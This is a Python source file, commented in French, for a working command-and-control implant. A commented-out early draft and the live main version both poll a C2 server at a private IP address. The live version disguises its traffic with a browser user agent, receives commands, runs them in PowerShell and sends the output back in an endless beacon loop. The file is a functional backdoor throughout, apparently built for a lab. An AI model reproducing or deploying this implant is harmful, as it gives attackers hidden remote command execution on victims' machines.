# import time, urllib.request, subprocess
# import uuid

# SESSION_ID = str(uuid.uuid4())[:8]
# C2 = "http://192.168.1.10:8000/"   # IP de ton PC

# while True:
#     try:
#         cmd = urllib.request.urlopen(C2, timeout=5).read().decode() or "whoami"
#         out = subprocess.run(cmd, shell=True, capture_output=True).stdout
#         urllib.request.urlopen(C2, data=out, timeout=5)
#     except Exception as e:
#         print(f"[!] Erreur réseau : {e}")
#     time.sleep(5)



import json
import subprocess
import time
import uuid
import urllib.request
import urllib.error

# ==============================
# CONFIG
# ==============================
# C2_URL = "http://192.168.1.92:8000/"
C2_URL = "http://10.84.107.141:8000"
BEACON_INTERVAL = 5           # secondes entre deux beacons
REQUEST_TIMEOUT = 5           # secondes
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)

# ID unique de cette session (cet implant)
SESSION_ID = str(uuid.uuid4())[:8]


def beacon(output: str) -> str:
    """
    Envoie un POST au C2 avec le résultat précédent,
    reçoit en retour la prochaine commande (ou "" si rien).
    """
    payload = json.dumps({
        "sid": SESSION_ID,
        "output": output,
    }).encode()

    req = urllib.request.Request(
        C2_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
        },
    )

    with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
        data = json.loads(resp.read())
        return data.get("cmd", "")


def run_command(cmd: str) -> str:
    """Exécute une commande dans PowerShell et renvoie sa sortie (stdout + stderr)."""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", cmd],
            capture_output=True,
            timeout=30,
        )
        out = result.stdout + result.stderr
        return out.decode("cp850", errors="ignore").strip() or "[no output]"
    except subprocess.TimeoutExpired:
        return "[!] timeout de la commande"
    except Exception as e:
        return f"[!] erreur d'exécution : {e}"


def main():
    print(f"[*] Implant démarré — session {SESSION_ID}")
    print(f"[*] C2 : {C2_URL}")

    last_output = ""  # résultat à envoyer au prochain beacon

    while True:
        try:
            # 1. Envoyer le dernier résultat, recevoir une commande
            cmd = beacon(last_output)

            # 2. Exécuter si commande non vide
            if cmd:
                print(f"[<] commande reçue : {cmd}")
                last_output = run_command(cmd)
                print(f"[>] output : {last_output[:120]}...")  # tronqué pour lisibilité
            else:
                last_output = ""  # rien à renvoyer

        except urllib.error.URLError as e:
            print(f"[!] C2 injoignable : {e}")
            last_output = ""
        except Exception as e:
            print(f"[!] erreur : {type(e).__name__}: {e}")
            last_output = ""

        time.sleep(BEACON_INTERVAL)


if __name__ == "__main__":
    main()